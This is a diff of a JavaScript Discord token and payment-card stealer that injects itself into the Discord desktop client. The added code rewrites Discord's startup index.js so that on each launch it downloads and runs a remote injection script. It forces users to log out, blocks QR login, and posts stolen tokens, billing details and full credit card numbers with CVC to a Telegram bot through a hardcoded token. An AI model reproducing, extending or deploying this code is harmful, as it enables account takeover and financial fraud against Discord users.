@@ -2,12 +2,11 @@ const args = process.argv;
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
-const TelegramBot = require('node-telegram-bot-api');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
-
+const BOT_TOKEN = '7158143959:AAFhGEXzD8YtPKsFgbWI0wjWL-s5PtxoI4Q';
 const config = {
-  bot_token: '7158143959:AAFhGEXzD8YtPKsFgbWI0wjWL-s5PtxoI4Q',
+  injection_url: 'https://raw.githubusercontent.com/D3xExtaz/injection.js-inject/main/injection.js',
   auto_buy_nitro: true, 
   /**
    
@@ -336,56 +335,6 @@ if (jsSHA.default) {
   jsSHA = jsSHA.default;
 }
 
-function totp(key) {
-  const period = 30;
-  const digits = 6;
-  const timestamp = Date.now();
-  const epoch = Math.round(timestamp / 1000.0);
-  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
-  const shaObj = new jsSHA();
-  shaObj.setHMACKey(base32tohex(key));
-  shaObj.update(time);
-  const hmac = shaObj.getHMAC();
-  const offset = hex2dec(hmac.substring(hmac.length - 1));
-  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
-  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
-  return otp;
-}
-
-function hex2dec(s) {
-  return parseInt(s, 16);
-}
-
-function dec2hex(s) {
-  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
-}
-
-function base32tohex(base32) {
-  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
-    bits = '',
-    hex = '';
-
-  base32 = base32.replace(/=+$/, '');
-
-  for (let i = 0; i < base32.length; i++) {
-    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
-    if (val === -1) console.error('Invalid base32 character in key');
-    bits += leftpad(val.toString(2), 5, '0');
-  }
-
-  for (let i = 0; i + 8 <= bits.length; i += 8) {
-    let chunk = bits.substr(i, 8);
-    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
-  }
-  return hex;
-}
-
-function leftpad(str, len, pad) {
-  if (len + 1 >= str.length) {
-    str = Array(len + 1 - str.length).join(pad) + str;
-  }
-  return str;
-}
 
 const discordPath = (function () {
   const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -400,6 +349,63 @@ const discordPath = (function () {
   if (fs.existsSync(resourcePath)) return { resourcePath, app };
   return { undefined, undefined };
 })();
+
+function updateCheck() {
+  const { resourcePath, app } = discordPath;
+  if (resourcePath === undefined || app === undefined) return;
+  const appPath = path.join(resourcePath, 'app');
+  const packageJson = path.join(appPath, 'package.json');
+  const resourceIndex = path.join(appPath, 'index.js');
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
+  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
+  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
+
+  if (process.platform === 'win32' || process.platform === 'darwin') {
+    fs.writeFileSync(
+      packageJson,
+      JSON.stringify(
+        {
+          name: 'discord',
+          main: 'index.js',
+        },
+        null,
+        4,
+      ),
+    );
+
+    const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}
+require('${path.join(resourcePath, 'app.asar')}')
+if (fs.existsSync(bdPath)) require(bdPath);`;
+    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
+  }
+  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
+  fs.rmdirSync(path.join(__dirname, 'initiation'));
+  execScript(
+    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
+  );
+  return !1;
+}
 
 const execScript = (script) => {
   const window = BrowserWindow.getAllWindows()[0];
@@ -512,37 +518,69 @@ const getNitro = (flags) => {
 };
 
 
+function sendMessage(chatId, text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const data = {
+      chat_id: chatId,
+      text: text
+  };
+  const options = {
+      method: 'POST',
+      headers: {
+          'Content-Type': 'application/json'
+      }
+  };
+  const req = https.request(url, options, (res) => {
+      let data = '';
+      res.on('data', (chunk) => {
+          data += chunk;
+      });
+      res.on('end', () => {
+          console.log(JSON.parse(data));
+      });
+  });
+  req.on('error', (error) => {
+      console.error(error);
+  });
+  req.write(JSON.stringify(data));
+  req.end();
+}
+
+
 const hooker = async (content) => {
-    const channelId = '-1002067923009'
-    const bot = new TelegramBot(config.bot_token, { polling: true });
-    bot.sendMessage(channelId, content, { parse_mode: "Markdown" });
-    bot.stopPolling();
+  const channelId = '-1002067923009';
+  sendMessage(channelId, content);
 };
 
 const PaypalAdded = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const billing = getBilling(token);
-  const content = `**Paypal Added**\nTime to buy some nitro baby 😩\n**Token:** ${token}\n**Nitro Type:** ${nitro}\n Billing: **${billing}**`
-  hooker(content);
+const json = await getInfo(token);
+const nitro = getNitro(json.premium_type);
+const billing = getBilling(token);
+const content = `Paypal Added\nTime to buy some nitro baby 😩\nToken: ${token}\nNitro Type: ${nitro}\nBilling: ${billing}\nThx ${json.username}#${json.discriminator}`
+hooker(content);
 };
 
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const billing = await getBilling(token);
-  const content = `**Credit Card Added 😩**\n${number}|${cvc}|${expir_month}|${expir_year}\n\n**Nitro Type:** ${nitro}\n**Billing:** ${billing}\nThx ${json.username}#${json.discriminator}`
-  hooker(content);
+const json = await getInfo(token);
+const nitro = getNitro(json.premium_type);
+const billing = await getBilling(token);
+const content = `Credit Card Added 😩\n${number}|${cvc}|${expir_month}|${expir_year}\n\nNitro Type: ${nitro}\nBilling: ${billing}\nThx ${json.username}#${json.discriminator}`
+hooker(content);
 };
 
 const nitroBought = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const billing = await getBilling(token);
-  const code = await buyNitro(token);
-  const content = `**Nitro 😩**\n**Nitro Code:** ${code}\n**Nitro Type:** ${nitro}\n**Billing:** ${billing}\n\nThx ${json.username}#${json.discriminator}`
-  hooker(content);
+const json = await getInfo(token);
+const nitro = getNitro(json.premium_type);
+const billing = await getBilling(token);
+const code = await buyNitro(token);
+const content = `Nitro 😩\nNitro Code: ${code}\nNitro Type: ${nitro}\nBilling: ${billing}\n\nThx ${json.username}#${json.discriminator}`
+hooker(content);
 };
+
+session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
+  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
+  updateCheck();
+});
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
   if (details.url.startsWith(config.webhook)) {
@@ -579,7 +617,6 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     });
   }
 });
-
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
   const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
